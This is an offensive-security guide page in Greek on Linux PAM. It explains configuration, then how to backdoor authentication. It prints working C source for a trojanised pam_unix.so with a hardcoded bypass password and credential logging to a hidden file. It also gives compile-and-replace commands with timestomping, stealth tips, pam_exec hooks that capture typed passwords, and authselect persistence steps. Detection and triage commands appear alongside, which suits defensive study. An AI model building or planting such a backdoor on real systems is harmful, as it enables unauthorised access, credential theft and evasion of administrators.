# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Βασικές πληροφορίες

Το **PAM (Pluggable Authentication Modules)** λειτουργεί ως μηχανισμός ασφαλείας που **επαληθεύει την ταυτότητα των χρηστών οι οποίοι προσπαθούν να αποκτήσουν πρόσβαση σε computer services**, ελέγχοντας την πρόσβασή τους με βάση διάφορα κριτήρια. Είναι παρόμοιο με έναν ψηφιακό θυρωρό, διασφαλίζοντας ότι μόνο εξουσιοδοτημένοι χρήστες μπορούν να χρησιμοποιούν συγκεκριμένες υπηρεσίες, ενώ ενδέχεται να περιορίζει τη χρήση τους για την αποτροπή υπερφόρτωσης του συστήματος.

#### Αρχεία διαμόρφωσης

- Τα **Solaris και UNIX-based systems** χρησιμοποιούν συνήθως ένα κεντρικό αρχείο διαμόρφωσης που βρίσκεται στο `/etc/pam.conf`.
- Τα **Linux systems** προτιμούν μια προσέγγιση που βασίζεται σε directory, αποθηκεύοντας configurations ειδικά για κάθε service μέσα στο `/etc/pam.d`. Για παράδειγμα, το configuration file για το login service βρίσκεται στο `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Ένα παράδειγμα PAM configuration για το login service μπορεί να έχει την εξής μορφή:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Περιοχές Διαχείρισης PAM**

Αυτές οι περιοχές ή ομάδες διαχείρισης περιλαμβάνουν τις **auth**, **account**, **password** και **session**, καθεμία από τις οποίες είναι υπεύθυνη για διαφορετικές πτυχές της διαδικασίας authentication και διαχείρισης session:<sup>[[1]](#references)</sup>

- **Auth**: Επικυρώνει την ταυτότητα του χρήστη, συνήθως ζητώντας έναν κωδικό πρόσβασης.
- **Account**: Διαχειρίζεται την επαλήθευση του account, ελέγχοντας συνθήκες όπως τη συμμετοχή σε group ή περιορισμούς βάσει ώρας.
- **Password**: Διαχειρίζεται τις ενημερώσεις κωδικών πρόσβασης, συμπεριλαμβανομένων των ελέγχων πολυπλοκότητας ή της αποτροπής dictionary attacks.
- **Session**: Διαχειρίζεται ενέργειες κατά την έναρξη ή τη λήξη ενός service session, όπως το mounting directories ή ο καθορισμός resource limits.

#### **Έλεγχοι Module του PAM**

Οι έλεγχοι καθορίζουν την απόκριση του module σε επιτυχία ή αποτυχία, επηρεάζοντας τη συνολική διαδικασία authentication. Περιλαμβάνουν τα εξής:<sup>[[1]](#references)</sup>

- **Required**: Η αποτυχία ενός required module οδηγεί τελικά σε αποτυχία, αλλά μόνο αφού ελεγχθούν όλα τα επόμενα modules.
- **Requisite**: Άμεσος τερματισμός της διαδικασίας σε περίπτωση αποτυχίας.
- **Sufficient**: Η επιτυχία παρακάμπτει τους υπόλοιπους ελέγχους του ίδιου realm, εκτός αν αποτύχει ένα επόμενο module.
- **Optional**: Προκαλεί αποτυχία μόνο αν είναι το μοναδικό module στο stack.

#### Offensive Semantics That Matter

Κατά το backdooring του PAM, η **τοποθεσία του εισαγόμενου rule** είναι συχνά σημαντικότερη από το ίδιο το payload:

- Τα `include` και `substack` εισάγουν rules από άλλα αρχεία, επομένως η επεξεργασία του `sshd` μπορεί να επηρεάζει μόνο το SSH, ενώ η επεξεργασία των `system-auth`, `common-auth` ή άλλου shared stack επηρεάζει πολλές services ταυτόχρονα.
- Το PAM υποστηρίζει επίσης bracketed controls όπως το `[success=1 default=ignore]`. Αυτά μπορούν να χρησιμοποιηθούν για **παράκαμψη ενός ή περισσότερων modules** μετά από έναν επιτυχημένο custom check, αντί για εμφανή αντικατάσταση του `pam_unix.so`.
- Το `module-path` μπορεί να είναι **absolute** (`/usr/lib/security/pam_custom.so`) ή **relative** προς το προεπιλεγμένο PAM module directory. Σε σύγχρονα Linux systems οι πραγματικοί κατάλογοι είναι συχνά οι `/lib/security`, `/lib64/security`, `/usr/lib/security` ή multiarch paths όπως το `/usr/lib/x86_64-linux-gnu/security`.

Γρήγορο operator takeaway: να χαρτογραφείτε πάντα το **πλήρες service graph** πριν από οποιοδήποτε patching. Για παράδειγμα, τα `sshd -> password-auth -> system-auth` σε ορισμένα distros ή `sshd -> system-remote-login -> system-login -> system-auth` σε άλλα σημαίνουν ότι το ίδιο one-line implant μπορεί να έχει πολύ ευρύτερη επίδραση από την προβλεπόμενη.

#### Example Scenario

Σε ένα setup με πολλά auth modules, η διαδικασία ακολουθεί αυστηρή σειρά. Αν το module `pam_securetty` διαπιστώσει ότι το login terminal δεν είναι εξουσιοδοτημένο, τα root logins αποκλείονται, ωστόσο όλα τα modules εξακολουθούν να υποβάλλονται σε επεξεργασία λόγω της κατάστασής του ως "required". Το `pam_env` ορίζει environment variables, διευκολύνοντας ενδεχομένως την εμπειρία του χρήστη. Τα modules `pam_ldap` και `pam_unix` συνεργάζονται για το authentication του χρήστη, με το `pam_unix` να επιχειρεί να χρησιμοποιήσει έναν κωδικό πρόσβασης που έχει δοθεί προηγουμένως, βελτιώνοντας την αποδοτικότητα και την ευελιξία των μεθόδων authentication.


## Backdooring PAM – Hooking `pam_unix.so`

Ένα κλασικό persistence trick σε Linux environments υψηλής αξίας είναι η **αντικατάσταση της legitimate PAM library με ένα trojanised drop-in**. Επειδή κάθε SSH / console login καταλήγει να καλεί το `pam_unix.so:pam_sm_authenticate()`, μερικές γραμμές C αρκούν για την καταγραφή credentials ή την υλοποίηση ενός *magic* password bypass.<sup>[[2]](#references)</sup>

### Cheatsheet Compilation
<details>
<summary>Δείγμα trojan `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compile και stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Συμβουλές OpSec
1. **Ατομική αντικατάσταση** – γράψτε σε ένα προσωρινό αρχείο και χρησιμοποιήστε `mv` για την αντικατάσταση, ώστε να αποφύγετε βιβλιοθήκες που έχουν γραφτεί μερικώς και θα μπορούσαν να αποκλείσουν το SSH.
2. Η τοποθέτηση του αρχείου log, όπως στο `/usr/bin/.dbus.log`, το κάνει να μοιάζει με νόμιμα artefacts του desktop.
3. Διατηρήστε τις exports των symbols ίδιες (`pam_sm_setcred`, κ.λπ.), ώστε να αποφύγετε δυσλειτουργίες του PAM.

### Εντοπισμός
* Συγκρίνετε το MD5/SHA256 του `pam_unix.so` με αυτό του distro package.
* Τα `rpm -V pam` ή `debsums -s libpam-modules` εντοπίζουν αντικατεστημένες βιβλιοθήκες χωρίς manual hashing.
* Ελέγξτε για world-writable αρχεία ή ασυνήθιστη ιδιοκτησία κάτω από το `/lib/security/`.
* Κανόνας `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Κάντε Grep στις PAM configs για μη αναμενόμενα modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Γρήγορες εντολές triage (μετά από compromise ή threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Κατάχρηση του `pam_exec` για persistence
Αντί να αντικαταστήσετε το `pam_unix.so`, μια πιο ήπια προσέγγιση είναι να προσθέσετε μια γραμμή `pam_exec` στο `/etc/pam.d/sshd`, ώστε κάθε SSH login να εκκινεί ένα implant, διατηρώντας ανέπαφο το κανονικό stack:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
Το `pam_exec` λαμβάνει PAM metadata σε environment variables όπως `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` και `PAM_TYPE`. Με `expose_authtok`, το helper μπορεί επίσης να διαβάσει τον κωδικό πρόσβασης από το `stdin` κατά τις φάσεις `auth` ή `password`. Αν θέλετε το helper να εκτελείται με το effective UID αντί για το real UID, προσθέστε `seteuid`.

Πρακτικές σημειώσεις:

- Το `session optional pam_exec.so ...` είναι καταλληλότερο για **post-login actions**, όπως το εκ νέου άνοιγμα sockets ή η εκκίνηση ενός detached daemon.
- Το `auth optional pam_exec.so quiet expose_authtok ...` είναι η συνηθισμένη επιλογή για **credential capture**, επειδή εκτελείται πριν ανοίξει το session.
- Τα `type=session` ή `type=auth` μπορούν να χρησιμοποιηθούν για τον περιορισμό της εκτέλεσης σε συγκεκριμένη PAM phase και την αποφυγή θορυβώδους διπλής εκτέλεσης.

### Επιβίωση από τα εργαλεία του distro: `authselect`

Σε RHEL, CentOS Stream, Fedora και derivative systems, οι απευθείας αλλαγές σε generated files όπως `/etc/pam.d/system-auth` ή `/etc/pam.d/password-auth` ενδέχεται να **αντικατασταθούν από το `authselect`**. Για persistence, οι operators συχνά τροποποιούν το active custom profile κάτω από το `/etc/authselect/custom/<profile>/` και στη συνέχεια το επιλέγουν ξανά ή το εφαρμόζουν.

Τυπική ροή εργασίας όταν έχετε root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Αυτό έχει σημασία τόσο για το offense όσο και για το triage: αν το `/etc/pam.d/system-auth` περιέχει το banner `Generated by authselect` και το `Do not modify this file manually`, τότε το πραγματικό persistence point μπορεί να βρίσκεται κάτω από το `/etc/authselect/custom/` και όχι στο `/etc/pam.d/`.

### Πρόσφατο tradecraft που έχει παρατηρηθεί στην πράξη

Πρόσφατες αναφορές του 2025 σχετικά με το **Plague** Linux backdoor έδειξαν την ίδια βασική ιδέα σε πιο εξελιγμένη μορφή: ένα κακόβουλο PAM component με **static bypass password**, καθώς και εκκαθάριση μεταβλητών περιβάλλοντος που σχετίζονται με το SSH και του shell history (`HISTFILE=/dev/null`), ώστε να μειώνονται τα ίχνη της συνεδρίας μετά το login.<sup>[[3]](#references)</sup> Αυτό αποτελεί χρήσιμο hunting pattern, επειδή η λογική του backdoor μπορεί να βρίσκεται στο PAM, ενώ τα stealth artifacts να εμφανίζονται μόνο **μετά** την επιτυχή authentication.


## References

- [1] [pam.conf(5) / pam.d(5) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Το Playbook του Covert Operator: Διείσδυση σε παγκόσμια τηλεπικοινωνιακά δίκτυα - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Ένα νέο PAM-Based Backdoor για Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
